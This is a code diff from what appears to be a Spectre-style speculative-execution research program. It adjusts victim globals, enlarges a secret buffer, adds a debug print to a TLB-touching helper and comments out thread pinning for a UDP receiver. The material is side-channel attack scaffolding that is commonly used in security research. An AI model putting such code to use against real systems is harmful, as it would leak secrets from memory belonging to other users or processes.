@@ -42,6 +42,7 @@
 /********************************************************************
 Victim globals.
 ********************************************************************/
+constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
 //constexpr size_t MAX_LEN = 256 * 512;
 
 /* Other global (optional) parameters */
@@ -56,7 +57,7 @@ uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
 
-constexpr size_t MAX_BUF_LENGTH = 4096;
+constexpr size_t MAX_BUF_LENGTH = 1<<20;  // 1MB (for many secrets if you so desire)
 // Contiguous, nearby secret in static-globals section:
 char secret_global[MAX_BUF_LENGTH];
 // Contiguous, secret's data exists on heap:
@@ -268,7 +269,6 @@ inline void flush_condition() {
 
 
 inline bool touch_secret(size_t i = 0) {
-  constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
   volatile static uint8_t tmp;
 
   // Fill TLB with entry correspoding to each secret:
@@ -285,19 +285,19 @@ inline bool touch_secret(size_t i = 0) {
 
 
 inline bool touch_va(size_t va) {
-  constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
   volatile static uint8_t tmp;
 
   // Fill TLB with entry correspoding to va:
   // -- side effect: pulls first cache line of page into cache.
   const uint8_t* page = reinterpret_cast<uint8_t*>(va & ~(PAGE_SIZE-1));
+  printf("Touching TLB page with 1 byte load at VA: %p\n", page);
+
   tmp ^= *page;
   return tmp == 0;  // unsued return
 }
 
 
 inline bool touch_page(size_t x) {
-  constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
   volatile static uint8_t tmp;
 
   // Calculate pointer to first byte in page:
@@ -467,10 +467,10 @@ int main(int argc, char* const argv[]) {
 
   // Setup receive thread to imitate server:
   std::thread t(recv_worker_v2, udp_port);
-  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
-  if (rc != 0) {
-    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
-  }
+//  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
+//  if (rc != 0) {
+//    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
+//  }
 
   // Simply sufficient time for threads to start before prompting user:
   std::this_thread::sleep_for(std::chrono::milliseconds(100));
